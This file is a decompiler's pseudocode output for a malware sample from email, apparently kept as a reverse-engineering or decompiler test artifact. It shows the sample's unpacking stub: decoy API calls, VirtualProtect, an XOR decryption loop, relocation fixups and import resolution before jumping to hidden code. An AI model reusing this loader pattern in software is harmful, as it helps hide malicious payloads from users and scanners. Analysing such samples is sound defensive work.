// subject.c
// Generated on 5/4/2015 12:43:55 AM by decompiling malware_via_email/malware_0117/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 edx, word32 edi)
{
fn00401000_entry:
l00401000:
	word32 eax_26 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 esi_15 = 0x00000000
	word32 ebx_290 = eax_26 + 0x00000025
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040102A
l00401027:
	ebx_290 = eax_26 + 0x00000003
l0040102A:
	Mem43[fp - 0x00000020:word32] = 0x00000059
	CloseHandle(0xFFFFFFFF)
	Mem48[fp - 0x00000020:word32] = fp - 0x0000000C
	Mem50[fp - 0x00000024:word32] = 0x00000040
	Mem52[fp - 0x00000028:word32] = 0x00003000
	Mem54[fp - 0x0000002C:word32] = 0x00401000
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_59 = 0x00000000
l00401050:
	branch esi_15 != ebx_290 l00401056
l00401054:
	esi_15 = 0x00000000
l00401056:
	byte v14_75 = Mem54[eax_59 + 0x00401278:byte] ^ Mem54[esi_15 + 0x00404000:byte]
	Mem76[eax_59 + 0x00401278:byte] = v14_75
	eax_59 = eax_59 + 0x00000001
	esi_15 = esi_15 + 0x00000001
	branch eax_59 <u 0x00001420 l00401050
l00401072:
	word32 ecx_116 = 0x00402558
	word32 dwLoc08_120 = 0x00000000
l00401093:
	word32 eax_97 = Mem76[ecx_116 + 0x00000004:word32]
	word32 edx_102 = ecx_116 + 0x00000008
	branch eax_97 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010CD
l004010A2:
	word32 esi_268 = eax_97 - 0x00000008 >>u 0x00000001
l004010A4:
	word32 eax_271 = (word32) Mem76[edx_102 + 0x00000000:word16]
	branch (eax_271 & 0x0000F000) != 0x00003000 l004010C5
l004010BA:
	word32 eax_282 = (eax_271 & 0x00000FFF) + Mem76[ecx_116 + 0x00000000:word32]
	Mem285[eax_282 + 0x00400FF8:word32] = Mem76[eax_282 + 0x00400FF8:word32] + 0xF0400FF8
l004010C5:
	edx_102 = edx_102 + 0x00000002
	esi_268 = esi_268 - 0x00000001
	branch esi_268 != 0x00000000 l004010A4
l004010CD:
	word32 eax_106 = Mem76[ecx_116 + 0x00000004:word32]
	word32 edx_108 = dwLoc08_120 + eax_106
	word32 ecx_109 = ecx_116 + eax_106
	branch edx_108 <u 0x000000E4 l00401093
	word32 eax_113 = Mem76[ecx_109 + 0x00000004:word32]
	word32 edx_115 = edx_108 + eax_113
	ecx_116 = ecx_109 + eax_113
	dwLoc08_120 = edx_115
	branch edx_115 <u 0x000000E4 l00401093
l004010E4:
	branch Mem76[0x00401D64:word32] == 0x00000000 l00401167
	word32 esi_127 = 0x00401D54
	word32 dwLoc08_128 = 0x00401D54
	esi_152 = esi_127
	branch Mem76[0x00401D64:word32] == 0x00000000 l00401167
l004010F7:
	word32 esi_152
	branch LoadLibraryA(Mem76[esi_152 + 0x0000000C:word32] + 0x00400FF8) == 0x00000000 l0040115A
	word32 eax_168 = LoadLibraryA(Mem76[esi_152 + 0x0000000C:word32] + 0x00400FF8)
	word32 edi_170 = eax_168
	branch eax_168 == 0x00000000 l0040115A
l0040110D:
	branch Mem76[esi_152 + 0x00000000:word32] != 0x00000000 l00401116
	word32 ebx_194 = Mem76[esi_152 + 0x00000000:word32]
	branch ebx_194 != 0x00000000 l00401116
l00401113:
	ebx_194 = Mem76[esi_152 + 0x00000010:word32]
l00401116:
	word32 ebx_199 = ebx_194 + 0x00400FF8
	word32 eax_202 = Mem76[ebx_199 + 0x00000000:word32]
	word32 esi_203 = Mem76[esi_152 + 0x00000010:word32] + 0x00400FF8
	byte S_206 = cond(eax_202)
	branch eax_202 == 0x00000000 l00401156
l00401126:
	word32 eax_238
	branch S_206 l0040113C
l00401128:
	eax_238 = GetProcAddress(edi_170, (word32) Mem76[ebx_199 + 0x00000000:word16])
	edi_170 = eax_168
	goto l00401148
l0040113C:
	eax_238 = GetProcAddress(edi_170, eax_202 + 0x00400FFA)
l00401148:
	Mem243[esi_203 + 0x00000000:word32] = eax_238
	ebx_199 = ebx_199 + 0x00000004
	eax_202 = Mem243[ebx_199 + 0x00000000:word32]
	esi_203 = esi_203 + 0x00000004
	S_206 = cond(eax_202) (alias)
	branch eax_202 != 0x00000000 l00401126
l00401156:
	esi_152 = dwLoc08_128
l0040115A:
	esi_152 = esi_152 + 0x00000014
	dwLoc08_128 = esi_152
	branch Mem76[esi_152 + 0x00000010:word32] != 0x00000000 l004010F7
l00401167:
	call 0x00401A48 (retsize: 4; depth: 32)
	ExitProcess(0x00000000)
fn00401000_exit:
}

